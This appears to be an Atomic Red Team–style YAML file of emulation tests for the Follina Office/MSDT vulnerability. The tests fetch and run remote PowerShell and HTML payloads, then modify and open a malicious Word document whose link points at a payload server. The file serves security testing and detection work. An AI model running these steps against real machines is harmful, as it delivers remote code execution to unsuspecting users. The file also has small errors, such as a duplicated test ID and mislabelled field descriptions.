attack_technique: Office Zero Day Vulneraibilty [Follina]
display_name: Office Zero Day Vulneraibilty [Follina]
atomic_tests:
- name: Office Zero Day Vulneraibilty [Follina] 
  auto_generated_guid: 63e31d69-2ef9-46de-907c-0fa91b10692c
  description: |
    To test the Follina zero-day vulnerability, first create an IIS application that will be used to store the HTML code that will be loaded by the endpoint.
    Please keep in mind that this test only works with Windows Server.
  supported_platforms:
    - windows
  input_arguments:

    WebAppDir_TestPath:
      description: Path to WebApp Directory 
      type: string
      default: $env:TEMP/test
       
    WebAppScript_TestPath:
      description: Path to WebApp script
      type: string
      default: $env:TEMP/test/WebApp_Script.ps1
      
    HTML_TestPathA:
      description: Path to poc1.html
      type: string
      default: $env:TEMP/test/poc1.html
  
    HTML_TestPathB:
      description: Path to poc2.html
      type: string
      default: $env:TEMP/test/poc2.html
      
    WebApp_Script:
      description: URL of WebApp script
      type: url
      default: 'https://github.com/CyberCastle-Blueteam/OpenThreatDetectionRules/raw/main/Office_MSDT_1Click_Exploit/scripts/WebApp_Script.ps1'
      
    Remote_htmlA:
      description: URL of poc1.html
      type: url
      default: 'https://github.com/CyberCastle-Blueteam/OpenThreatDetectionRules/raw/main/Office_MSDT_1Click_Exploit/src/poc1.html'
      
    Remote_htmlB:
      description: URL of poc2.html
      type: url
      default: 'https://github.com/CyberCastle-Blueteam/OpenThreatDetectionRules/raw/main/Office_MSDT_1Click_Exploit/src/poc2.html'
  dependency_executor_name: powershell
  dependencies:
  - description: |
      WebApp Phy Directory must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{WebAppDir_TestPath}") { exit 0} else { exit 1}
    get_prereq_command: |
       New-Item -Path $env:Temp/test -ItemType Directory


  - description: |
      WebApp_RemTemplate.ps1 must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{WebAppScript_TestPath}") { exit 0} else { exit 1}
    get_prereq_command: |
       Invoke-WebRequest #{WebApp_Script} -OutFile "#{WebAppScript_TestPath}"
       &$env:TEMP\test\WebApp_Script.ps1 -SelectMode Install

  - description: |
      poc.html must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{HTML_TestPathA}") { exit 0} else { exit 1}
    get_prereq_command: |
       Invoke-WebRequest #{Remote_htmlA} -OutFile "#{HTML_TestPathA}" 

  - description: |
      poc.html must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{HTML_TestPathB}") { exit 0} else { exit 1}
    get_prereq_command: |
       Invoke-WebRequest #{Remote_htmlB} -OutFile "#{HTML_TestPathB}"
        
  executor:
    command: |
        try {
        $HTTP_Request = [System.Net.WebRequest]::Create('http://localhost/test/');
        $HTTP_Response = $HTTP_Request.GetResponse();
        $HTTP_Status = [int]$HTTP_Response.StatusCode;
        if($HTTP_Status -eq '200') {write-host WebApp is ready}}
        catch {write-host "Something went wrong while install the WebApp !"}

    cleanup_command: |
      &$env:TEMP/test/WebApp_Script.ps1 -SelectMode Uninstall   

    name: powershell
    elevation_required: true
    
- name: Office Zero Day Vulneraibilty [Follina]
  auto_generated_guid: 63e31d69-2ef9-46de-907c-0fa91b10692c
  description: |
    This test simulates an adversary executing powershell code via Microsoft Diagnostic Tool (MSDT) by loading a remote malicious HTML when a word document is opened.
    Note: Make sure the first Red Atomic test was run on a different machine with a Windows Server OS installed, as this will be used to store the required HTML payload to be loaded in the word document. Also, change the RemoteSrv IP value to your server's IP address!
  supported_platforms:
    - windows
  input_arguments:

    MalDoc_TestPath:
      description: Path to MalDoc
      type: string
      default: $env:TEMP/MalDoc_MSDT.doc
      
    RemoteSrv_IP:
      description: Path to MalDoc
      type: string
      default: 192.168.44.132
                 
    MalDoc_MSDT:
      description: Path to MalDoc_MSDT.doc
      type: url
      default: 'https://github.com/CyberCastle-Blueteam/OpenThreatDetectionRules/blob/main/Office_MSDT_1Click_Exploit/src/MalDoc_MSDT.doc'
      
  dependency_executor_name: powershell
  dependencies:

  - description: |
      MalDoc_MSDT.doc must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{MalDoc_TestPath}") { exit 0} else { exit 1}
    get_prereq_command: |
       Invoke-WebRequest #{MalDoc_MSDT} -OutFile "#{MalDoc_TestPath}" 
        
  executor:
    command: |
        try {
        $HTTP_Request = [System.Net.WebRequest]::Create('http://localhost/test/');
        $HTTP_Response = $HTTP_Request.GetResponse();
        $HTTP_Status = [int]$HTTP_Response.StatusCode;
        if($HTTP_Status -eq '200') {Copy-Item $env:temp/MalDoc_MSDT.doc $env:temp/MalDoc_MSDT.zip;Expand-Archive $env:temp/MalDoc_MSDT.zip -DestinationPath $env:temp/doc/; (Get-Content  $env:temp/doc/word/_rels/document.xml.rels) -Replace 'localhost/poc.html', '#{RemoteSrv_IP}/test/poc1.html' | Set-Content $env:temp/doc/word/_rels/document.xml.rels;Compress-Archive -Path $env:temp/doc/* -DestinationPath $env:temp/doc/test.zip;Rename-Item -Path $env:temp/doc/test.zip -NewName $env:temp/doc/test.doc;Start-Process $env:temp/doc/test.doc}}
        catch {write-host "Failed to open MalDoc !"}
        
       
    cleanup_command: |
      Remove-Item -Path #{MalDoc_TestPath} -Force  
      Remove-Item $env:temp/doc -Recurse -Force 
      Remove-Item $env:temp/MalDoc_MSDT.zip -Force
    name: powershell
    elevation_required: true
    
- name: Office Zero Day Vulneraibilty [Follina]
  auto_generated_guid: 63e31d69-2ef9-46de-907c-0fa91b10692d
  description: |
    This test simulates an adversary executing powershell code via Microsoft Diagnostic Tool (MSDT) by loading a remote malicious HTML when a word document is opened.
    Note: Make sure the first Red Atomic test was run on a different machine with a Windows Server OS installed, as this will be used to store the required HTML payload to be loaded in the word document. Also, change the RemoteSrv IP value to your server's IP address!
  supported_platforms:
    - windows
  input_arguments:

    MalDoc_TestPath:
      description: Path to MalDoc
      type: string
      default: $env:TEMP/MalDoc_MSDT.doc
      
    RemoteSrv_IP:
      description: IP of the remote server that stores the HTML Code.
      type: string
      default: 192.168.44.132
                 
    MalDoc_MSDT:
      description: Path to MalDoc_MSDT.doc
      type: url
      default: 'https://github.com/CyberCastle-Blueteam/OpenThreatDetectionRules/blob/main/Office_MSDT_1Click_Exploit/src/MalDoc_MSDT.doc'
      
  dependency_executor_name: powershell
  dependencies:

  - description: |
      MalDoc_MSDT.doc must exists on the HardDisk in Temp Directory
    prereq_command: |
      if (Test-Path "#{MalDoc_TestPath}") { exit 0} else { exit 1}
    get_prereq_command: |
       Invoke-WebRequest #{MalDoc_MSDT} -OutFile "#{MalDoc_TestPath}" 
        
  executor:
    command: |
        try {
        $HTTP_Request = [System.Net.WebRequest]::Create('http://localhost/test/');
        $HTTP_Response = $HTTP_Request.GetResponse();
        $HTTP_Status = [int]$HTTP_Response.StatusCode;
        if($HTTP_Status -eq '200') {Copy-Item $env:temp/MalDoc_MSDT.doc $env:temp/MalDoc_MSDT.zip;Expand-Archive $env:temp/MalDoc_MSDT.zip -DestinationPath $env:temp/doc/; (Get-Content $env:temp/doc/word/_rels/document.xml.rels) -Replace 'localhost/poc.html', '#{RemoteSrv_IP}/test/poc2.html' | Set-Content $env:temp/doc/word/_rels/document.xml.rels;Compress-Archive -Path $env:temp/doc/* -DestinationPath $env:temp/doc/test.zip;Rename-Item -Path $env:temp/doc/test.zip -NewName $env:temp/doc/test.doc;Start-Process $env:temp/doc/test.doc}}
        catch {write-host "Failed to open MalDoc !"}
        
        

    cleanup_command: |
      Remove-Item -Path #{MalDoc_TestPath} -Force  
      Remove-Item $env:temp/doc -Recurse -Force 
      Remove-Item $env:temp/MalDoc_MSDT.zip -Force
    name: powershell
    elevation_required: true    
    
